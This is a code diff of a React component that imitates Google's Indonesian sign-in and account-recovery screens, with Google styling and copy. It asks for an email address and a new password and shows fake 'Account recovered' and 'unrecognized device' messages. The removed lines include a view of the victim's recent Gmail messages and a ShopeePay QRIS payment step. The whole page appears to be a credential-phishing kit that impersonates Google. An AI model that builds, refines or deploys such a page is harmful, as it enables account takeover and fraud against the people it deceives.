         <AnimatePresence>
@@ -952,117 +580,76 @@ export default function App() {
               <div className="px-6 pb-6 pt-2 sm:px-10 sm:pb-8 flex flex-col items-start">
                 {step === 'email' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[36px] text-[#1f1f1f] font-normal mb-1.5 mt-4 leading-tight">{t.loginTitle}</h1>
-                    <p className="text-[#1f1f1f] text-[16px] font-normal">{t.loginSubtitle}</p>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Pemulihan akun</h1>
+                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Memulihkan Akun Google Anda</p>
                   </>
                 )}
                 {step === 'password' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.welcomeBackTitle}</h1>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Selamat datang kembali</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[12px] mt-2 inline-flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max max-w-full`}
-                      style={{ textDecoration: 'none' }}
+                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                     >
-                      <UserAvatar
-                        customOverride={customAvatar}
-                        photoURL={googleUser?.photoURL}
-                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                        size={20}
-                      />
-                      <span className="no-underline decoration-none truncate leading-none text-[14px] font-medium text-[#1f1f1f] pt-[0.5px]" style={{ textDecoration: 'none', borderBottom: 'none' }}>
-                        {email || 'rukho977@gmail.com'}
-                      </span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[16px] h-[16px] text-[#1f1f1f] flex-shrink-0 ml-0.5">
-                        <path d="M7 10l5 5 5-5z"/>
-                      </svg>
+                      <div className="w-5 h-5 rounded-full bg-[#1f1f1f] flex items-center justify-center text-white overflow-hidden flex-shrink-0">
+                        <svg viewBox="0 0 24 24" className="w-[14px] h-[14px]" fill="currentColor">
+                          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                        </svg>
+                      </div>
+                      <span>{email}</span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
                   </>
                 )}
                 {step === 'change_password' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.changePasswordTitle}</h1>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Ubah sandi</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[12px] mt-2 inline-flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max max-w-full`}
-                      style={{ textDecoration: 'none' }}
+                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                     >
-                      <UserAvatar
-                        customOverride={customAvatar}
-                        photoURL={googleUser?.photoURL}
-                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                        size={20}
-                      />
-                      <span className="no-underline decoration-none truncate leading-none text-[14px] font-medium text-[#1f1f1f] pt-[0.5px]" style={{ textDecoration: 'none', borderBottom: 'none' }}>
-                        {email || 'rukho977@gmail.com'}
-                      </span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[16px] h-[16px] text-[#1f1f1f] flex-shrink-0 ml-0.5">
-                        <path d="M7 10l5 5 5-5z"/>
-                      </svg>
+                      <div className="w-5 h-5 rounded-full bg-[#1f1f1f] flex items-center justify-center text-white overflow-hidden flex-shrink-0">
+                        <svg viewBox="0 0 24 24" className="w-[14px] h-[14px]" fill="currentColor">
+                          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                        </svg>
+                      </div>
+                      <span>{email}</span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
                   </>
                 )}
                 {step === 'success' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[36px] text-[#1f1f1f] font-normal mb-1.5 mt-4 leading-tight">{t.successTitle}</h1>
-                    <div 
-                      onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[12px] mt-2 inline-flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max max-w-full`}
-                      style={{ textDecoration: 'none' }}
-                    >
-                      <UserAvatar
-                        customOverride={customAvatar}
-                        photoURL={googleUser?.photoURL}
-                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                        size={20}
-                      />
-                      <span className="no-underline decoration-none truncate leading-none text-[14px] font-medium text-[#1f1f1f] pt-[0.5px]" style={{ textDecoration: 'none', borderBottom: 'none' }}>
-                        {email || 'rukho977@gmail.com'}
-                      </span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[16px] h-[16px] text-[#1f1f1f] flex-shrink-0 ml-0.5">
-                        <path d="M7 10l5 5 5-5z"/>
-                      </svg>
-                    </div>
-                  </>
-                )}
-                {step === 'payment' && (
-                  <>
-                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.paymentTitle}</h1>
-                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">{t.paymentSubtitle}</p>
+                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Berhasil</h1>
+                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Akun Anda telah dipulihkan.</p>
                   </>
                 )}
                 {step === 'error' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.cantSignInTitle}</h1>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Tidak dapat memproses login Anda</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[12px] mt-2 inline-flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max max-w-full`}
-                      style={{ textDecoration: 'none' }}
+                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                     >
-                      <UserAvatar
-                        customOverride={customAvatar}
-                        photoURL={googleUser?.photoURL}
-                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                        size={20}
-                      />
-                      <span className="no-underline decoration-none truncate leading-none text-[14px] font-medium text-[#1f1f1f] pt-[0.5px]" style={{ textDecoration: 'none', borderBottom: 'none' }}>
-                        {email || 'rukho977@gmail.com'}
-                      </span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[16px] h-[16px] text-[#1f1f1f] flex-shrink-0 ml-0.5">
-                        <path d="M7 10l5 5 5-5z"/>
-                      </svg>
+                      <div className="w-5 h-5 rounded-full bg-[#1f1f1f] flex items-center justify-center text-white overflow-hidden flex-shrink-0">
+                        <svg viewBox="0 0 24 24" className="w-[14px] h-[14px]" fill="currentColor">
+                          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                        </svg>
+                      </div>
+                      <span>{email}</span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
                   </>
                 )}
               </div>
 
         {/* Content/Form Section */}
-        <div className="px-6 pb-4 sm:px-10 sm:pb-8 flex flex-col flex-grow">
+        <div className="px-6 pb-10 flex flex-col flex-grow sm:px-10">
           {step === 'email' && (
-            <form onSubmit={handleEmailSubmit} className="flex flex-col flex-grow justify-between">
+            <form onSubmit={handleEmailSubmit} className="flex flex-col flex-grow justify-start">
               <div className="pt-2">
                 <TextInput
-                  label={t.emailOrPhoneLabel}
+                  label="Email atau nomor telepon"
                   value={email}
                   onChange={(e: any) => {
                     setEmail(e.target.value);
@@ -1073,63 +660,41 @@ export default function App() {
                   autoFocus
                   disabled={isLoading}
                 />
-
-                <div className="mt-2">
-                  <button
-                    type="button"
-                    className="text-[#0b57d0] hover:underline font-medium text-[14px] transition text-left"
-                    disabled={isLoading}
-                  >
-                    {t.forgotEmail}
-                  </button>
-                </div>
-
-                <div className="mt-8 sm:mt-9 text-[14px] text-[#444746] leading-relaxed">
-                  <span>{t.guestModeText}</span>
-                  <a
-                    href="#"
-                    onClick={(e) => e.preventDefault()}
-                    className="text-[#0b57d0] font-medium hover:underline inline ml-1"
-                  >
-                    {t.learnMoreGuestMode}
-                  </a>
-                </div>
               </div>
-
-              <div className="mt-8 flex justify-between items-center pb-2 sm:pb-0">
+              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                 <button
                   type="button"
-                  className="text-[#0b57d0] hover:bg-blue-50/50 px-3 py-2 -ml-3 rounded-full font-medium text-[14px] transition"
+                  className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                   disabled={isLoading}
                 >
-                  {t.createAccount}
+                  Lupa email?
                 </button>
                 <button
                   type="submit"
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
                 >
-                  {t.next}
+                  Berikutnya
                 </button>
               </div>
             </form>
           )}
 
           {step === 'password' && (
-            <div className="flex flex-col flex-grow justify-between pt-2">
+            <div className="flex flex-col flex-grow justify-start pt-6">
               <div>
                 <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
-                  {t.forgotPasswordNotice}
+                  Anda dapat memperbarui sandi Anda sekarang jika Anda lupa.
                 </p>
               </div>
-              <div className="mt-8 flex justify-between items-center pb-2 sm:pb-0">
+              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                 <button
                   type="button"
                   onClick={() => changeStep('change_password', 1)}
                   className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                   disabled={isLoading}
                 >
-                  {t.updatePasswordBtn}
+                  Perbarui sandi
                 </button>
                 <button
                   type="button"
@@ -1137,22 +702,22 @@ export default function App() {
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
                 >
-                  {t.continueBtn}
+                  Lanjutkan
                 </button>
               </div>
             </div>
           )}
 
           {step === 'change_password' && (
-            <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-between">
+            <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-start">
               <div className="pt-2">
-                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-2 sm:mt-4 mb-1">{t.createStrongPasswordHeading}</h2>
+                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-4 mb-1">Buat sandi yang kuat</h2>
                 <p className="text-[#444746] text-[14px] mb-6 leading-normal">
-                  {t.createStrongPasswordDesc}
+                  Buat sandi baru yang kuat dan tidak Anda gunakan untuk situs lain
                 </p>
 
                 <TextInput
-                  label={t.createPasswordLabel}
+                  label="Buat sandi"
                   type={showPassword ? "text" : "password"}
                   value={password}
                   onChange={(e: any) => {
@@ -1160,14 +725,14 @@ export default function App() {
                     if (error) setError('');
                   }}
                   name="password"
-                  error={error && (error === t.enterPasswordError || error === t.passwordMin8Error) ? error : ''}
+                  error={error && (error.includes('sandi') || error.includes('8 karakter')) ? error : ''}
                   autoFocus
                   disabled={isLoading}
                 />
 
                 <div className="mt-4">
                   <TextInput
-                    label={t.confirmPasswordLabel}
+                    label="Konfirmasi"
                     type={showPassword ? "text" : "password"}
                     value={confirmPassword}
                     onChange={(e: any) => {
@@ -1175,13 +740,13 @@ export default function App() {
                       if (error) setError('');
                     }}
                     name="confirmPassword"
-                    error={error && error === t.passwordMismatchError ? error : ''}
+                    error={error && error.includes('cocok') ? error : ''}
                     disabled={isLoading}
                   />
                 </div>
 
                 <div className="text-[12px] text-[#444746] mt-1.5 pl-3">
-                  {t.atLeast8Chars}
+                  Minimal 8 karakter
                 </div>
 
                 <div className="mt-4">
@@ -1193,177 +758,50 @@ export default function App() {
                       className="w-[18px] h-[18px] rounded border-[#747775] text-[#0b57d0] focus:ring-[#0b57d0] cursor-pointer"
                       disabled={isLoading}
                     />
-                    <span>{t.showPassword}</span>
+                    <span>Tampilkan sandi</span>
                   </label>
                 </div>
               </div>
 
-              <div className="mt-8 flex justify-between items-center pb-2 sm:pb-0">
+              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                 <button
                   type="button"
                   onClick={() => changeStep('error', 1)}
                   className="text-[#0b57d0] hover:bg-blue-50 px-4 py-2.5 -ml-3 rounded-full font-medium text-[14px] transition"
                   disabled={isLoading}
                 >
-                  {t.skipBtn}
+                  Lewati
                 </button>
                 <button
                   type="submit"
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
                 >
-                  {t.savePasswordBtn}
+                  Simpan sandi
                 </button>
               </div>
             </form>
           )}
 
           {step === 'success' && (
-            <div className="flex flex-col flex-grow justify-between">
-              <div className="pt-1 w-full">
-                <div className="flex items-center justify-between mb-2 px-0.5">
-                  <span className="text-[13px] font-medium text-[#444746] tracking-wide uppercase">{t.recentEmails}</span>
-                  <span className="text-[11px] text-[#0b57d0] font-semibold bg-[#e8f0fe] px-2.5 py-0.5 rounded-full">Gmail</span>
-                </div>
-
-                {isFetchingEmails ? (
-                  <div className="w-full py-10 flex flex-col items-center justify-center text-[#5f6368] text-[13px] gap-2.5 border border-[#e0e3e7] rounded-[16px] bg-[#f8fafd]/50">
-                    <div className="w-6 h-6 border-2 border-[#0b57d0] border-t-transparent rounded-full animate-spin"></div>
-                    <span>{t.loadingGmail}</span>
-                  </div>
-                ) : (
-                  <div className="w-full border border-[#747775]/30 rounded-[16px] overflow-hidden bg-white divide-y divide-[#f1f3f4] shadow-xs">
-                    {(emailsData.length > 0 ? emailsData : [
-                      {
-                        sender: 'Google Community Team',
-                        subject: lang === 'id' ? 'Selesaikan penyiapan Akun Google Anda' : 'Finish setting up your Google Account',
-                        date: lang === 'id' ? 'Baru saja' : 'Just now',
-                      },
-                      {
-                        sender: 'Google Security',
-                        subject: lang === 'id' ? 'Peringatan keamanan baru' : 'New security alert',
-                        date: '10:42',
-                      },
-                      {
-                        sender: 'Gmail Team',
-                        subject: lang === 'id' ? 'Tips memaksimalkan kotak masuk Gmail' : 'Tips to get the most out of Gmail',
-                        date: lang === 'id' ? 'Kemarin' : 'Yesterday',
-                      }
-                    ]).map((item: any, idx: number) => {
-                      let from = item.sender || t.unknownSender;
-                      let subject = item.subject || t.noSubject;
-                      let dateStr = item.date || '';
-
-                      if (item.payload) {
-                        const subjectHeader = item.payload?.headers?.find((h: any) => h.name === 'Subject');
-                        const fromHeader = item.payload?.headers?.find((h: any) => h.name === 'From');
-                        const dateHeader = item.payload?.headers?.find((h: any) => h.name === 'Date');
-                        if (subjectHeader) subject = subjectHeader.value;
-                        if (fromHeader) from = fromHeader.value.split('<')[0].trim().replace(/['"]/g, '');
-                        if (dateHeader) {
-                          try {
-                            const d = new Date(dateHeader.value);
-                            dateStr = d.toLocaleDateString(lang === 'id' ? 'id-ID' : 'en-US', { hour: '2-digit', minute: '2-digit' });
-                          } catch {
-                            dateStr = '';
-                          }
-                        }
-                      }
-
-                      return (
-                        <div
-                          key={idx}
-                          className="px-3.5 py-3 flex items-center gap-3.5 hover:bg-[#f8fafd] transition-colors cursor-pointer select-none"
-                        >
-                          <UserAvatar
-                            customOverride={customAvatar}
-                            photoURL={googleUser?.photoURL}
-                            nameOrEmail={from}
-                            size={32}
-                            className="w-[32px] h-[32px] flex-shrink-0"
-                          />
-                          <div className="flex-1 min-w-0 pr-1">
-                            <div className="flex items-center justify-between gap-1">
-                              <p className="font-medium text-[#1f1f1f] text-[13px] truncate">{from}</p>
-                              {dateStr && (
-                                <span className="text-[11px] text-[#5f6368] whitespace-nowrap flex-shrink-0 font-normal">{dateStr}</span>
-                              )}
-                            </div>
-                            <p className="text-[#444746] text-[12px] truncate mt-0.5">{subject}</p>
-                          </div>
-                        </div>
-                      );
-                    })}
-                  </div>
-                )}
-                
-                <p className="text-[13px] text-[#444746] mt-3.5 leading-relaxed px-0.5">
-                  {t.successNewPasswordNotice}
-                </p>
-              </div>
-
-              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
+            <div className="flex flex-col flex-grow justify-start">
+               <div className="pt-2">
+                 <p className="text-[#444746] text-[14px]">Anda sekarang dapat menggunakan sandi baru Anda untuk login.</p>
+               </div>
+               <div className="mt-8 flex justify-end items-center pb-6 sm:pb-0">
                 <button
-                  type="button"
-                  onClick={() => changeStep('email', -1)}
-                  className="text-[#0b57d0] hover:bg-blue-50/50 px-3 py-2 -ml-3 rounded-full font-medium text-[14px] transition"
-                  disabled={isLoading}
-                >
-                  {lang === 'id' ? 'Ganti akun' : 'Switch account'}
-                </button>
-                <button
-                  type="button"
                   onClick={() => {
-                    changeStep('payment', 1);
+                    setEmail('');
+                    setPassword('');
+                    setConfirmPassword('');
+                    changeStep('email', -1);
                   }}
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
                 >
-                  {t.doneBtn}
+                  Selesai
                 </button>
               </div>
-            </div>
-          )}
-
-          {step === 'payment' && (
-            <div className="flex flex-col flex-grow justify-start pt-6">
-               <div className="flex flex-col items-center border border-[#e0e3e7] p-6 rounded-[24px]">
-                 <div className="w-full flex justify-between items-center mb-4">
-                   <span className="font-semibold text-[18px] text-[#ff6600]">ShopeePay</span>
-                   <span className="bg-[#ff6600] text-white px-2 py-1 rounded text-[12px] font-bold">QRIS</span>
-                 </div>
-                 
-                 <div className="w-[200px] h-[200px] bg-gray-100 flex items-center justify-center rounded-[12px] border-2 border-dashed border-gray-300 relative overflow-hidden mb-4">
-                    {/* Placeholder for QR Code */}
-                    <div className="text-center p-4">
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-12 h-12 mx-auto text-gray-400 mb-2">
-                        <path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v3h-3v-3zm-3 3h3v3h-3v-3zm3 3h3v3h-3v-3zm-3-3h-3v3h3v-3zm-3-3h3v3h-3v-3z" />
-                      </svg>
-                      <span className="text-[12px] text-gray-500 font-medium break-words block">
-                        {import.meta.env.VITE_SHOPEEPAY_API_KEY ? t.qrCodeActive : t.apiKeyNotConfigured}
-                      </span>
-                    </div>
-                 </div>
-
-                 <p className="text-[#1f1f1f] text-center text-[14px] leading-relaxed mb-6">
-                   {t.qrInstructions}
-                 </p>
-
-                 <div className="w-full flex justify-end">
-                  <button
-                    onClick={() => {
-                      setEmail('');
-                      setPassword('');
-                      setConfirmPassword('');
-                      changeStep('email', -1);
-                    }}
-                    className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed w-full sm:w-auto"
-                    disabled={isLoading}
-                  >
-                    {t.backToStartBtn}
-                  </button>
-                 </div>
-               </div>
             </div>
           )}
 
@@ -1371,10 +809,10 @@ export default function App() {
             <div className="flex flex-col flex-grow justify-start pt-6">
               <div>
                 <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
-                  {t.unrecognizedDeviceMsg1}
+                  Anda mencoba login di perangkat yang tidak dikenali oleh Google, dan kami tidak memiliki cukup informasi untuk memverifikasi ini benar-benar Anda. Untuk perlindungan Anda, Anda tidak dapat login di sini saat ini.
                 </p>
                 <p className="text-[#1f1f1f] text-[16px] leading-[24px] mt-4">
-                  {t.unrecognizedDeviceMsg2} <span className="text-[#0b57d0] cursor-pointer hover:underline font-medium">{t.learnMore}</span>
+                  Coba lagi dari perangkat atau lokasi tempat Anda login sebelumnya. <span className="text-[#0b57d0] cursor-pointer hover:underline font-medium">Pelajari lebih lanjut</span>
                 </p>
               </div>
             </div>
@@ -1385,39 +823,23 @@ export default function App() {
         </div>
       </div>
 
-      {/* Mobile Subtle Divider */}
-      <div className="w-full border-t border-[#f2f2f2] sm:hidden" />
-
       {/* Footer */}
-      <div className="w-full sm:max-w-[448px] px-6 py-3.5 sm:px-0 sm:pb-0 sm:pt-6 flex flex-col sm:flex-row justify-between text-[12px] text-[#444746] bg-white sm:bg-transparent">
+      <div className="w-full sm:max-w-[448px] px-6 pb-6 pt-2 sm:px-0 sm:pb-0 sm:pt-6 flex flex-col sm:flex-row justify-between text-[12px] text-[#444746] bg-white sm:bg-transparent">
         <div className="flex justify-start items-center">
-          <LanguageSelector lang={lang} setLang={setLang} upward={true} />
+          <div className="flex items-center gap-1 cursor-pointer hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 rounded transition">
+            Indonesia
+            <svg fill="currentColor" viewBox="0 0 24 24" width="16px" height="16px">
+              <path d="M7 10l5 5 5-5z" />
+            </svg>
+          </div>
         </div>
-        <div className="flex gap-4 sm:gap-6 mt-3 sm:mt-0 items-center justify-start sm:justify-end">
-          <a href="#" className="hover:text-[#1f1f1f] px-1 py-1 -ml-1 sm:ml-0 transition">{t.help}</a>
-          <a href="#" className="hover:text-[#1f1f1f] px-1 py-1 transition">{t.privacy}</a>
-          <a href="#" className="hover:text-[#1f1f1f] px-1 py-1 transition">{t.terms}</a>
+        <div className="flex gap-4 sm:gap-6 mt-4 sm:mt-0 items-center justify-start sm:justify-end">
+          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 sm:-ml-0 rounded transition">Bantuan</a>
+          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">Privasi</a>
+          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">Persyaratan</a>
         </div>
       </div>
 
     </div>
-
-    {/* Secret Feature Area at the very bottom of the main page (Scroll down) */}
-    <div className="w-full max-w-[480px] my-28 px-4 flex flex-col items-center">
-      <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
-        <span className="w-12 h-px bg-gray-200"></span>
-        <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
-        <span className="w-12 h-px bg-gray-200"></span>
-      </div>
-      <SecretAvatarPanel
-        config={customAvatar}
-        onChange={handleCustomAvatarChange}
-        email={email}
-        t={t}
-        lang={lang}
-      />
-    </div>
-
-  </div>
-);
+  );
 }
